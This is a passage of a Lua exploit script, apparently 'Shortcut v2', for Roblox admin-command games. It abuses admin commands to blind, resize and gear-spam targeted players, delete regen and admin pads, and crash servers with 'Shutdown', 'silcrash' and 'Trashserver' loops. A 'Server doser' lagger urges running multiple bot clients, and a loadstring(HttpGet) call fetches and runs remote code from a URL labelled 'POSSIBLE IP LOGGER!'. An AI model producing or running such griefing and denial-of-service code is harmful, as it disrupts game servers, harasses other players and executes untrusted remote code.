                            cht("blind " .. msggg)
                            wait(0.8)
                            cht("noclip " .. msggg .. "");wait(0.35)
                            cht("size " .. msggg .. " nan");wait(0.8)
                            cht("gear " .. msggg .. " 000000000000000000159229806");wait(1.5)
                            cht("gear " .. msggg .. " 000000000000000000233520257")
                            cht("gear " .. msggg .. " 000000000000000000120307951");wait(2.5)
                            cht("gear " .. msggg .. " 00000000000000000080661504")
                            cht("gear " .. msggg .. " 00000000000000000093136802");wait(.35)
                            cht("gear " .. msggg .. " 00000000000000000099119240")
                            cht("gear " .. msggg .. " 00000000000000000073829193");wait(.65)
                            cht("gear " .. msggg .. " 000000000000000000139577901")
                            cht("gear " .. msggg .. " 0000000000000000002544549379");wait(3)
                            temploopgrab = false
                    end
                    if string.sub(msg:lower(), 0, 7 + #prefix) == prefix .. "zahando" then
                        local msggg = string.sub(msg:lower(), 9 + #prefix)
                            temploopgrab = true
                            cht("blind " .. msggg)
                            wait(0.8)
                            cht("noclip " .. msggg .. "");wait(0.35)
                            cht("size " .. msggg .. " nan");wait(0.8)
                            cht("gear " .. msggg .. " 000000000000000000159229806");wait(1.5)
                            cht("gear " .. msggg .. " 000000000000000000233520257")
                            cht("gear " .. msggg .. " 000000000000000000120307951");wait(2.5)
                            cht("gear " .. msggg .. " 00000000000000000080661504")
                            cht("gear " .. msggg .. " 00000000000000000093136802");wait(.35)
                            cht("music 304787933")
                            cht("gear " .. msggg .. " 00000000000000000099119240")
                            cht("gear " .. msggg .. " 00000000000000000073829193");wait(.65)
                            cht("gear " .. msggg .. " 000000000000000000139577901")
                            cht("gear " .. msggg .. " 0000000000000000002544549379");wait(3)
                            cht("invis all");wait()
                            cht("unblind all");wait()
                            cht("//crazycolors")
                            temploopgrab = false
                    end
                    if string.sub(msg:lower(), 0, 8 + #prefix) == prefix .. "funtools" then
                        local msggg = string.sub(msg:lower(), 10 + #prefix)
                            temploopgrab = true
                            cht("skydive " .. msggg)
                            cht("invis all")
                            cht("h \n\n\nServer Message: Santa has delivered some sweet tools. If you were lucky you'd have them B-)\n\n\n")
                            wait(0.8)
                            cht("noclip " .. msggg .. "");wait(0.35)
                            cht("size " .. msggg .. " nan");wait(0.8)
                            cht("gear " .. msggg .. " 000000000000000000159229806");wait(1.5)
                            cht("gear " .. msggg .. " 000000000000000000233520257")
                            cht("gear " .. msggg .. " 000000000000000000120307951");wait(2.5)
                            cht("gear " .. msggg .. " 00000000000000000080661504")
                            cht("gear " .. msggg .. " 00000000000000000093136802");wait(.35)
                            cht("gear " .. msggg .. " 00000000000000000099119240")
                            cht("gear " .. msggg .. " 00000000000000000073829193");wait(.65)
                            cht("gear " .. msggg .. " 000000000000000000139577901")
                            cht("gear " .. msggg .. " 0000000000000000002544549379");wait(3)
                            temploopgrab = false
                    end
                    if string.sub(msg:lower(), 0, 7 + #prefix) == prefix .. "havefun" then
                        local msggg = string.sub(msg:lower(), 9 + #prefix)
                            temploopgrab = true
                            cht("blind " .. msggg)
                            wait(0.8)
                            cht("noclip " .. msggg .. "");wait(0.35)
                            cht("size " .. msggg .. " nan");wait(0.8)
                            cht("gear " .. msggg .. " 000000000000000000159229806");wait(1.5)
                            cht("gear " .. msggg .. " 000000000000000000233520257")
                            cht("gear " .. msggg .. " 000000000000000000120307951");wait(2.5)
                            cht("gear " .. msggg .. " 00000000000000000080661504")
                            cht("gear " .. msggg .. " 00000000000000000093136802");wait(.35)
                            cht("gear " .. msggg .. " 00000000000000000099119240")
                            cht("gear " .. msggg .. " 00000000000000000073829193");wait(.65)
                            cht("gear " .. msggg .. " 000000000000000000139577901")
                            cht("gear " .. msggg .. " 0000000000000000002544549379");wait(3)
                            temploopgrab = false
                    end
                    if string.sub(msg:lower(), 0, 9 + #prefix) == prefix .. "playhouse" then
                        local msggg = string.sub(msg:lower(), 11 + #prefix)
                            temploopgrab = true
                            cht("/pads");wait(.65)
                            cht("tp "..msggg.." me")
                            cht("invis " .. msggg)
                            wait(0.8)
                            cht("music 000000000000000000000000000001838663141");wait()
                            cht("noclip " .. msggg .. "");wait(0.35)
                            cht("size " .. msggg .. " nan");wait(0.8)
                            cht("gear " .. msggg .. " 000000000000000000159229806");wait(1.5)
                            cht("gear " .. msggg .. " 000000000000000000233520257")
                            cht("gear " .. msggg .. " 000000000000000000120307951");wait(2.5)
                            cht("gear " .. msggg .. " 00000000000000000080661504")
                            cht("gear " .. msggg .. " 00000000000000000093136802");wait(.35)
                            cht("gear " .. msggg .. " 00000000000000000099119240")
                            cht("gear " .. msggg .. " 00000000000000000073829193");wait(.65)
                            cht("gear " .. msggg .. " 000000000000000000139577901")
                            cht("gear " .. msggg .. " 0000000000000000002544549379");wait(3)
                            temploopgrab = false
                    end
                    if string.sub(msg:lower(), 0, 4 + #prefix) == prefix .. "stop" then
                        spam = false
                        cht("/stop " .. math.random(1, 1000))
                        cht("//clrsfx")
                    end
                    if string.sub(msg:lower(), 0, 5 + #prefix) == prefix .. "super" then
                        local msggggg = string.sub(msg:lower(), 7 + #prefix)
                        for i = 1, 69 do
                            cht(msggggg)
                        end
                    end
                end
            end)
    end)

game.Players.PlayerAdded:Connect(function(plr)
        if scriptActive then
            coroutine.wrap(
                function()
                    wait(1)
                    if plr.Name == "Shortcutv2Ownerxd" then
                        say("The owner of shortcut (v1/v2) has joined the game! (Mia)")
                        cht("//plrloadreg shortcut")
                        cht("/whitelist shortcut")
                    end
                    if plr.Name == "An0rdinaryGirl_Mia" then
                        say("The owner of shortcut has joined the server! (An0rdinaryGirl_Mia)")
                        cht("//loadreg An0");wait(10)
                    end
                end)()
        end
    end
)

print("Using the script without an ID may result in a blacklist")
--Addpoint
if shared.startupcmds == true then
    task.wait()
    cht("//startup")
end
workspace.DescendantAdded:Connect(function(child)
	if fpsboost then
		coroutine.wrap(function()
			if child:IsA('Explosion') then
				game:GetService'RunService'.Heartbeat:Wait()
				child:Destroy()
			elseif child:IsA('ForceField') then
				if child.Parent:FindFirstChild('Poop') then
					game:GetService'RunService'.Heartbeat:Wait()
					child:Destroy()
				else
					child.Name = 'Poop'
				end
			elseif child:IsA('Sparkles') then
				game:GetService'RunService'.Heartbeat:Wait()
				child:Destroy()
			elseif child:IsA('Smoke') then
				game:GetService'RunService'.Heartbeat:Wait()
				child:Destroy()
			end
		end)()
	end
end)
if SCV2_LOADED and not _G.SCV2_DEBUG == true then
    cht("/rejpiss")
	error("Shortcut v2 is already running",0)
	return
end

pcall(function() getgenv().SCV2_LOADED = true end)
for i, v in pairs(game.Players:GetPlayers()) do
    v.Backpack.ChildAdded:Connect(function(child)
            if child:IsA("Tool") and antigear then
                cht("ungear 00000000000000000000000000000 others " .. math.random(1, 1000))
            end
        end)
    v.CharacterAdded:Connect(function()v.Backpack.ChildAdded:Connect(function(child)
                    if child:IsA("Tool") and antigear then
                        cht("ungear 00000000000000000000000000000 others " .. math.random(1, 1000));wait(.5)
                        cht("ungear 00000000000000000000000000000 others " .. math.random(1, 1000))
                    end
                end)
        end)
end

game.Players.PlayerAdded:Connect(
    function(plr)
        game.Players.CharacterAdded:Connect(
            function()
                game.Players.Backpack.ChildAdded:Connect(function(child)
                        if child:IsA("Tool") and antigear then
                            cht("ungear 00000000000000000000000000000 others " .. math.random(1, 1000));wait(.5)
                            cht("ungear 00000000000000000000000000000 others " .. math.random(1, 1000));wait(.5)
                            cht("ungear 00000000000000000000000000000 others " .. math.random(1, 1000))
                        end
                    end)
            end)
    end)

local UserInputService = game:GetService("UserInputService")

UserInputService.WindowFocused:Connect(
    function()
        if autoafk == true then
            wait(1)
            cht("unname 000000000000000000000000000000000000000000000000000000000 me " .. math.random(1, 55))
            logn("Webcam detected movement. The AFK request has been revoked");wait(1)
            cht("unname 000000000000000000000000000000000000000000000000000000000 me " .. math.random(1, 55));wait(1)
            logn("Say cheese for the photo please");wait(7.5)
            logn("Photo sent to #staff-feet-pics")
        end
    end)

UserInputService.WindowFocusReleased:Connect(
    function()
        if autoafk == true then
            logn("Checking webcam...")
            cht("name me Request pending...");wait(.65)
            cht("name me Tabbed out - \n" .. game.Players.LocalPlayer.DisplayName)
            logn("AFK Successfully registered. The Image has been uploaded!")
        end
    end
)

function hook()
    human = plyrs.LocalPlayer.Character.Humanoid

    coroutine.wrap(function()
            human:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                    if antiSpeed then
                        human.WalkSpeed = 16
                    end
                end)
        end)()

    coroutine.wrap(function()
            plyrs.LocalPlayer.Character.DescendantAdded:Connect(function(i)
                    if i.Name == "BodyForce" and antiSetgrav then
                        local root = plyrs.LocalPlayer.Character.HumanoidRootPart
                        i.Force = Vector3.new(0, 0, 0)
                        repeat
                            rns.Heartbeat:Wait()
                        until i == nil
                        root.Velocity = Vector3.new(0, 0, 0)
                    elseif i.Name == "BodyPosition" and antiSetgrav then
                        i:Destroy()
                        root.Velocity = Vector3.new(0, 0, 0)
                    end
                end)
        end)()
end
hook()

local con5344 =
    plyrs.LocalPlayer.CharacterAdded:connect(
    function(chr)
        wait()
        hook()
    end)
table.insert(connections, con5344)

local RunService = game:GetService("RunService")
RunService.RenderStepped:Connect(
    function()
        if antiBlind == true then
            for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                if v.Name == "EFFECTGUIBLIND" then
                    v:Destroy()
                end
            end
        end
        if colors == true then
            while colors do
                cht(
                    "fogcolor " ..
                        tostring(math.random(0, 255)) ..
                            " " .. tostring(math.random(0, 255)) .. " " .. tostring(math.random(0, 255))
                )
                wait(.075)
            end
        end

        if antiMsg == true then
            for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                if v.Name == "MessageGUI" or v.Name == "Message" or v.Name == "HintGUI" or v.Name == "Ice" then
                    v:Destroy()
                end
            end
        end
    end)

wait(1.5)
perm = false

-- Custom PlayerList
-- Playerlist

local PlayerList = Instance.new("ScreenGui")

coroutine.wrap(function()
        -- Instances:

        local PlayerListMaster = Instance.new("Frame")
        local SizeOffsetFrame = Instance.new("Frame")
        local UIListLayout = Instance.new("UIListLayout")
        local ScrollingFrameContainer = Instance.new("Frame")
        local UIListLayout_2 = Instance.new("UIListLayout")

        --Properties:

        PlayerList.Name = "PlayerList"
        PlayerList.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        PlayerList.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        PlayerList.DisplayOrder = 1

        PlayerListMaster.Name = "PlayerListMaster"
        PlayerListMaster.Parent = PlayerList
        PlayerListMaster.AnchorPoint = Vector2.new(1, 0)
        PlayerListMaster.BackgroundTransparency = 1.000
        PlayerListMaster.Position = UDim2.new(1, -4, 0, 40)
        PlayerListMaster.Size = UDim2.new(0, 166, 0.1, 0)

        SizeOffsetFrame.Name = "SizeOffsetFrame"
        SizeOffsetFrame.Parent = PlayerListMaster
        SizeOffsetFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        SizeOffsetFrame.BackgroundTransparency = 1.000
        SizeOffsetFrame.Position = UDim2.new(0.5, 0, 0.881410241, 0)
        SizeOffsetFrame.Size = UDim2.new(1, 0, 2.5, 0) -- {1, 0},{3.003, 0}

        UIListLayout.Parent = SizeOffsetFrame
        UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

        ScrollingFrameContainer.Name = "ScrollingFrameContainer"
        ScrollingFrameContainer.Parent = SizeOffsetFrame
        ScrollingFrameContainer.BackgroundColor3 = Color3.fromRGB(31, 33, 35)
        ScrollingFrameContainer.BackgroundTransparency = 0.300
        ScrollingFrameContainer.BorderSizePixel = 0
        ScrollingFrameContainer.LayoutOrder = 3
        ScrollingFrameContainer.Position = UDim2.new(0, 0, 0.0145454546, 0)
        ScrollingFrameContainer.Size = UDim2.new(1, 0, 0.883456707, 40)

        UIListLayout_2.Parent = ScrollingFrameContainer
        UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder

        -- Scripts:

        local function KTJYHGG_fake_script()
            local script = Instance.new("LocalScript", ScrollingFrameContainer)

            function addBox(isPerm, plrName, plrDisplay)
                local PlayerHere = Instance.new("Frame")
                local ChildrenFrame = Instance.new("Frame")
                local NameFrame = Instance.new("Frame")
                local DisplayName = Instance.new("Frame")
                local PlayerName = Instance.new("TextLabel")
                local SizeConstraint = Instance.new("UITextSizeConstraint")
                local PermUI = Instance.new("Frame")
                local PlayerName_2 = Instance.new("TextLabel")
                local SizeConstraint_2 = Instance.new("UITextSizeConstraint")
                local PlayerName_3 = Instance.new("Frame")
                local PlayerName_4 = Instance.new("TextLabel")
                local SizeConstraint_3 = Instance.new("UITextSizeConstraint")
                local Layout = Instance.new("UIListLayout")

                PlayerHere.Name = plrName
                PlayerHere.Parent = script.Parent
                PlayerHere.BackgroundTransparency = 1.000
                PlayerHere.ClipsDescendants = true
                PlayerHere.Size = UDim2.new(1, 0, 0.158816129, 0)

                ChildrenFrame.Name = "ChildrenFrame"
                ChildrenFrame.Parent = PlayerHere
                ChildrenFrame.BackgroundTransparency = 1.000
                ChildrenFrame.Size = UDim2.new(1, 0, 0, 40)

                NameFrame.Name = "NameFrame"
                NameFrame.Parent = ChildrenFrame
                NameFrame.BackgroundTransparency = 1.000
                NameFrame.Size = UDim2.new(0, 150, 0, 40)

                DisplayName.Name = "DisplayName"
                DisplayName.Parent = NameFrame
                DisplayName.BackgroundTransparency = 1.000
                DisplayName.LayoutOrder = 3
                DisplayName.Position = UDim2.new(0.0799999982, 0, 0, 0)
                DisplayName.Size = UDim2.new(0.639999986, -34, 1, 0)

                PlayerName.Name = "PlayerName"
                PlayerName.Parent = DisplayName
                PlayerName.BackgroundTransparency = 1.000
                PlayerName.Position = UDim2.new(0.439606011, 0, 0.704999983, 0)
                PlayerName.Size = UDim2.new(1, 0, 0.439999998, 0)
                PlayerName.Font = Enum.Font.GothamSemibold
                PlayerName.Text = plrDisplay
                PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
                PlayerName.TextScaled = true
                PlayerName.TextSize = 14.000
                PlayerName.TextWrapped = true
                PlayerName.TextXAlignment = Enum.TextXAlignment.Left

                SizeConstraint.Name = "SizeConstraint"
                SizeConstraint.Parent = PlayerName
                SizeConstraint.MaxTextSize = 14
                SizeConstraint.MinTextSize = 9

                PermUI.Name = "PermUI"
                PermUI.Parent = NameFrame
                PermUI.BackgroundTransparency = 1.000
                PermUI.LayoutOrder = 3
                PermUI.Position = UDim2.new(0.0799999982, 0, 0, 0)
                PermUI.Size = UDim2.new(0.446666658, -34, 1, 0)

                PlayerName_2.Name = "PlayerName"
                PlayerName_2.Parent = PermUI
                PlayerName_2.BackgroundTransparency = 1.000
                PlayerName_2.Position = UDim2.new(0, 0, 0.280000001, 0)
                PlayerName_2.Size = UDim2.new(1, 0, 0.439999998, 0)
                PlayerName_2.Font = Enum.Font.GothamSemibold
                PlayerName_2.Text = "    "
                if isPerm then
                    PlayerName_2.Text = "VIP"
                end
                PlayerName_2.TextColor3 = Color3.fromRGB(255, 255, 255)
                PlayerName_2.TextScaled = true
                PlayerName_2.TextSize = 14.000
                PlayerName_2.TextWrapped = true
                PlayerName_2.TextXAlignment = Enum.TextXAlignment.Left

                SizeConstraint_2.Name = "SizeConstraint"
                SizeConstraint_2.Parent = PlayerName_2
                SizeConstraint_2.MaxTextSize = 14
                SizeConstraint_2.MinTextSize = 9

                PlayerName_3.Name = "PlayerName"
                PlayerName_3.Parent = NameFrame
                PlayerName_3.BackgroundTransparency = 1.000
                PlayerName_3.LayoutOrder = 3
                PlayerName_3.Size = UDim2.new(1, -34, 1, 0)

                PlayerName_4.Name = "PlayerName"
                PlayerName_4.Parent = PlayerName_3
                PlayerName_4.BackgroundTransparency = 1.000
                PlayerName_4.Position = UDim2.new(0.422413796, 0, 0.280000001, 0)
                PlayerName_4.Size = UDim2.new(1, 0, 0.439999998, 0)
                PlayerName_4.Font = Enum.Font.GothamSemibold
                PlayerName_4.Text = plrName
                PlayerName_4.TextColor3 = Color3.fromRGB(255, 255, 255)
                PlayerName_4.TextScaled = true
                PlayerName_4.TextSize = 14.000
                PlayerName_4.TextWrapped = true
                PlayerName_4.TextXAlignment = Enum.TextXAlignment.Left

                SizeConstraint_3.Name = "SizeConstraint"
                SizeConstraint_3.Parent = PlayerName_4
                SizeConstraint_3.MaxTextSize = 14
                SizeConstraint_3.MinTextSize = 9

                Layout.Name = "Layout"
                Layout.Parent = ChildrenFrame
                Layout.FillDirection = Enum.FillDirection.Horizontal
                Layout.SortOrder = Enum.SortOrder.Name
                Layout.VerticalAlignment = Enum.VerticalAlignment.Center
            end

            game.StarterGui:SetCoreGuiEnabled("PlayerList", false)

            game.Players.ChildRemoved:Connect(function(player)
                    if script.Parent:FindFirstChild(player.Name) then
                        script.Parent:FindFirstChild(player.Name):remove()
                    end
                end)

            while wait(1) do
                for _, plr in pairs(game.Players:GetChildren()) do
                    if not script.Parent:FindFirstChild(plr.Name) then
                        addBox(hasGamepass(plr.UserId, 66254), plr.Name, plr.DisplayName)
                        wait()
                    --script.Parent.Size = UDim2.new(0, 166, 0, (#script.Parent:GetChildren() - 1) * 50)
                    end
                end
            end
        end
        coroutine.wrap(KTJYHGG_fake_script)()
    end
)()

-- Instances:

local SCv2_ButtonList = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UIGridLayout = Instance.new("UIGridLayout")
local UICorner = Instance.new("UICorner")
local CloseUI = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")

--Properties:

SCv2_ButtonList.Name = "SCv2_ButtonList"
SCv2_ButtonList.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
SCv2_ButtonList.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = SCv2_ButtonList
Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
Frame.BorderColor3 = Color3.fromRGB(33, 33, 33)
Frame.Position = UDim2.new(0.137755096, 0, 0.319999993, 0)
Frame.Size = UDim2.new(0, 262, 0, 25)

ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
ScrollingFrame.BorderColor3 = Color3.fromRGB(33, 33, 33)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.0152671756, 0, 1, 0)
ScrollingFrame.Size = UDim2.new(0, 254, 0, 300)
ScrollingFrame.CanvasSize = UDim2.new(1, 0, 3, 0)

UIGridLayout.Parent = ScrollingFrame
UIGridLayout.CellSize = UDim2.new(1, -10, 0, 25)

UICorner.CornerRadius = UDim.new(0, 2)
UICorner.Parent = Frame

CloseUI.Name = "CloseUI"
CloseUI.Parent = Frame
CloseUI.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
CloseUI.BackgroundTransparency = 1.000
CloseUI.BorderColor3 = Color3.fromRGB(33, 33, 33)
CloseUI.Position = UDim2.new(5.904511452, 0, -1.0300000012, 0)
CloseUI.Size = UDim2.new(0, 25, 0, 25)
CloseUI.Font = Enum.Font.SourceSans
CloseUI.Text = "lol"
CloseUI.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseUI.TextSize = 14.000

UICorner_2.CornerRadius = UDim.new(0, 2)
UICorner_2.Parent = CloseUI

-- Scripts:

local function NKEI_fake_script() -- ScrollingFrame.LocalScript
    local script = Instance.new("LocalScript", ScrollingFrame)

    local ClrPlt = {
        DefBk = Color3.fromRGB(33, 33, 33),
        Enabled = Color3.fromRGB(44, 44, 44)
    }

    function addBtn(text, callback)
        local btn = Instance.new("TextButton", script.Parent)
        btn.BackgroundColor3 = ClrPlt.DefBk
        btn.BorderSizePixel = 0
        btn.Size = UDim2.new(0, 254, 0, 25)
        btn.Text = text
        btn.Name = text -- Order
        btn.TextSize = 14.000
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.MouseButton1Click:Connect(
            function()
                callback(btn)
            end)
    end

    function addTlg(text, callback_e, callback_d)
        addBtn(text,function(self)
                if self.BackgroundColor3 == ClrPlt.DefBk then
                    self.BackgroundColor3 = ClrPlt.Enabled
                    callback_e(self)
                else
                    self.BackgroundColor3 = ClrPlt.DefBk
                    callback_d(self)
                end
            end
        )
    end

    -- UI

    addTlg(
        "PadAbuse/loopgrab all",
        function()
            testgrab = true ;wait(5)
            padAbuse = true ;wait()
            testgrab = false
        end,
        function()
            padAbuse = false ;wait(5)
            padAbuse = false ;wait(5)
            padAbuse = false

        end
    )

    addTlg(
        "RainbowEx",
        function()
            cht("/super disco")
            rainbowEx = true
        end,
        function()
            rainbowEx = false ;wait(.2)
            cht("fix")
        end
    )

    addTlg(
        "ClickExplode",
        function()
            clickExpode = true
        end,
        function()
            clickExpode = false
        end
    )

    addTlg(
        "ClickPadban",
        function()
            clickPadban = true
        end,
        function()
            clickPadban = false
        end
    )

    addTlg(
        "ClickFard",
        function()
            cht("pm me /trap someone then spam this on them to lag them alot")
            farding = true
        end,
        function()
            farding = false
        end
    )
    addTlg(
        "ClickTrip",
        function()
            trippin = true
        end,
        function()
            trippin = false
        end
    )

    addTlg(
        "ClickAnnoy",
        function()
            cht("pm me Type [double slash]stop to stop it")
            logn("Type //stop to stop it")
            clickAnnoy = true
        end,
        function()
            clickAnnoy = false
        end
    )

    addBtn(
        "HideRegenPad NP*",
        function(v)
            game.Players:Chat("invis me")
            cht("//movereg")
            --[[game.Players:Chat("gear me 00000000000000000000000000000000108158379");wait() -- Moved to the loadstring.
            local function L_1_func()
                repeat wait()
                until game.Players.LocalPlayer.Backpack:FindFirstChild("IvoryPeriastron")
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
            end
            local function L_2_func()
                repeat wait()
                until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                local L_10_=game:GetService("Workspace").Terrain["_Game"]local L_11_=L_10_.Workspace;local L_12_=L_10_.Admin;local L_13_=game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")local L_14_=true
                spawn(function()
                    while true do
                        game:GetService('RunService').Heartbeat:Wait()
                        game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
                        L_13_.CFrame = L_12_.Regen.CFrame * CFrame.new(-1 * (L_12_.Regen.Size.X / 2) - (game.Players.LocalPlayer.Character['Torso'].Size.X / 2), 0, 0);wait()
                        if not L_14_ then
                            break
                        end
                    end
                end)
                spawn(function()
                    while L_14_ do
                        game:GetService('RunService').Heartbeat:Wait()
                        game.Players:Chat("unpunish me "..math.random(1,1000))
                    end
                end);wait(0.3)
                L_14_ = false
            end
            local L_3_ = math.random(1, 2)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(999999999999, 999999999, 9999999999);wait(.25)
            game.Players:Chat("setgrav me -550");wait()
            game.Players:Chat("gear me 00000000000000000000000000000108158379")
            L_1_func();wait(.35)
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
            local L_4_ = {
                [1] = Enum.KeyCode.E
            }
        
            game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_4_));wait()
            repeat wait()
            until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            game.Players:Chat("unfly me");wait(.2)
            repeat
                L_2_func()
        
            until game.Players.LocalPlayer.Character.Torso:FindFirstChild("Weld");wait()
        
            local L_5_ = {
                [1] = Enum.KeyCode.E
            }
        
            game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_5_))
            repeat wait()
            until not game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter")
        
            game.Players.LocalPlayer.Character:Destroy()
            L_1_func();wait(.35)
            local L_6_ = {
                [1] = Enum.KeyCode.E
            }
        
            game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_6_))
            repeat wait()
            until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1, -498, 1))
            for L_15_forvar0, L_16_forvar1 in pairs(game:GetService("Workspace").Camera:GetChildren()) do
                if L_16_forvar1.Name == "FakeCharacter" then
                    L_16_forvar1:Destroy()
                end
            end
            local L_7_ = game:GetService("Workspace").Terrain["_Game"]
            local L_8_ = L_7_.Workspace
            local L_9_ = L_7_.Admin]]
        end
    )

    addBtn(
        "DeleteRegenPad",
        function(v)
            game:GetService("Workspace").FallenPartsDestroyHeight = 0 / 0
            cht("invis me")
            logn("Turn on antipunish to increase the chances of this succeeding")
            cht("gear me 108158379")
            cht("/toggle antivoid");wait(.35)
            cht("fly me");cht("fly me")

        --Sussy part for the regen shit below


            wait(1.35)
            game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(math.random(-999999, 999999), math.random(-999999, 70000), math.random(-999999, 999999))) -- change this position to where ever you want to put your regen pad
            wait(.65)
            game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.E,false,game);wait(1.35)
            cht("fly me");cht("fly me")
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(math.random(-37876, 853406), math.random(-37876, 42407), math.random(-37876, 4359))) -- change this position to where ever you want to put your regen pad
            wait(.65)
            cht("/pads");cht("/pads");cht("/pads");cht("/pads")
            cht("unfly me");wait(.35)
            cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");wait(.35)
            cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");wait()
            cht("-reegeennbypass");wait()
            cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");cht("-reegeennbypass");wait(1)
            game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.E,false,game);wait(.35)
            cht("//up");wait(1.2)
            cht("respawn me")
            wait(10);game:GetService("Workspace").FallenPartsDestroyHeight = -10001

        end
    )

    addBtn(
        "RainbowPads",
        function(v)
            local speed = 32
            cht("gear me " .. csp .. "18474459");wait(1)
            game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket);wait(0.25)
            while true do
                for i = 0, 1, 0.001 * speed do
                    local clr = Color3.fromHSV(i, 1, 1)
                    local padss = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
                    for i, v in pairs(padss) do
                        local jkfv = v.Head
                        coroutine.wrap(function()
                                if jkfv:IsA("Part") then
                                    local v1 = {
                                        ["Part"] = jkfv,
                                        ["Color"] = clr
                                    }
                                    game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild(
                                        "Remotes"
                                    ).ServerControls:InvokeServer("PaintPart", v1)
                                end
                            end
                        )()
                    end
                    wait(1 / 12) -- recolor the map x times a second lol.
                end
            end
        end
    )

    addBtn(
        "Shutdown",
        function(v)
            cht("//shutdown");wait(35)
            cht("gear me 94794847")
            cht("size me 0.000000000000000003")
            cht("size me 0.000000000000000003")
            cht("size me 0.000000000000000003")
            cht("size me 0.000000000000000003")
            cht("size me 0.000000000000000003")
            cht("size me 0.000000000000000003")
            for i = 1, 700 do
                for i = 1, 3 do
                    cht("size all 0.3")
                end
                cht("freeze all")
                for i = 1, 3 do
                    cht("size all 9.9")
                end
                cht("clone all")
                wait(0.75)
                cht("unchar all")
            end
        end
    )

    addBtn(
        "silcrash",
        function(v)
            cht("//silcrash");wait(35)
            cht("gear me 94794847")
            cht("size me 0.000000000000000003")
            cht("size me 0.000000000000000003")
            cht("size me 0.000000000000000003")
            cht("size me 0.000000000000000003")
            cht("size me 0.000000000000000003")
            cht("size me 0.000000000000000003")
            for i = 1, 700 do
                for i = 1, 3 do
                    cht("size all 0.3")
                end
                cht("freeze all")
                for i = 1, 3 do
                    cht("size all 9.9")
                end
                cht("clone all")
                wait(0.75)
                cht("unchar all")
            end
        end
    )

    addBtn("DeleteAdminPads", function(v)
            cht("//movedb");wait(.35)
            cht("/toggle antivoid");wait(.35)
            cht("/removepadspiss");wait(15)
            cht("/toggle antivoid")
        end)

    addBtn(
        "Unpunish",
        function(v)
            game.Players.LocalPlayer.Character:Destroy()
            cht("unpunish me")
            cht("reset me")
            cht("refresh me")
            wait(.745)
            cht("/regpiss")
            --end)
        end
    )

    addBtn(
        "Trashserver",
        function(v)
            cht("//trashserver") -- Premium improved version
        end
    )

    addBtn(
        "*NoAdmin Lagger FE",
        function(v)
            logn("Status: Working \n Side note: Check the console with F9. ") -- Temp stuff until patched
            wait(1)
            print("Server doser \n Press the keybind C and it will start the lagger. \n Roblox has ratelimited this quite so it ain't that very effective anymore. \n It will automatically make you rejoin if your client disconnects. \n Pressing C again will disable the lag. In other words you can also time it to avoid getting crashed. \n To get the most out of this please use multi-instance execution. Synapse (Paid) and Fluxus (free) support that and 3 bots/clients has made a server crash before. \n Try to get atleast 3 to 4 bots in a server and then run the lagger and the server may crash \n\n\n\n\n\n\n\n\n You can get NoAdmin Lagger v2.4X in the #premium-scripts channel. It's way stronger than this version")
            cht("/bind reset [")
            cht("//infyield")
            loadstring(game:HttpGet(('POSSIBLE IP LOGGER!'),true))();wait(1.65)
            cht("///repott")
